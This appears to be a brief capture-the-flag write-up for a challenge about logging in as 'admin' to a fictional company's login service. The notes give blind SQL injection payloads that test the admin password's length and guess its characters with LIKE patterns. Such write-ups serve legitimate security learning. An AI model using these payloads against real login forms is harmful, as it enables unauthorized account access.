Problem:

Daedalus Corp. has once again improved their login service. They're so confident, in fact, that they added a new registration feature. Can you find a way to login as 'admin'?

Notes:

First check for admin account

username = admin

Then check password length

admin' AND length(password) = 27 AND 'a'='a

Then guess each character of the password

username = admin' AND password LIKE '%...'
